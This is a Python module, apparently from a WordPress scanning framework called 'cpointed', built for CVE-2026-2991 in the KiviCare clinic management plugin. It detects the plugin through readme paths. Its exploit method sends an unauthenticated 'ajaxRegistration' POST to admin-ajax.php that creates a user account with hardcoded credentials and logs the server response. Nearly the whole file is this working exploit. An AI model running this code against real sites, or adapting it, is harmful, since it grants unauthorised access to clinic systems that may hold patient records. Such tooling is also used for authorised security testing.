# Made by Sn0w8ird

from __future__ import annotations

from urllib.parse import urlencode

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20262991KiviCare(WordPressModule):
    name = "CVE-2026-2991"
    severity = 9.8
    affected_versions = ["kivicare/plugin tree: verify against vendor advisory"]
    cwe = "CWE-287 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/kivicare-clinic-management-system/readme.txt",
        "/wp-content/plugins/kivicare/readme.txt",
    )
    slug_hint = "kivicare"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """Registration / AJAX user primitive (field names from clinic plugin patterns — verify on target build)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            fields = {
                "action": "ajaxRegistration",
                "username": "cpointed_kc_audit",
                "email": "kc_audit@cpointed.invalid",
                "password": "CpointedAudit!9x",
                "first_name": "Cpointed",
                "last_name": "Audit",
                "user_type": "patient",
            }
            body = urlencode(fields).encode("utf-8")
            r = await client.request(
                "POST",
                ajax,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                content=body,
                timeout=timeout,
            )
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": fields["action"],
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append({"action": "ajaxRegistration", "error": str(exc)})
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
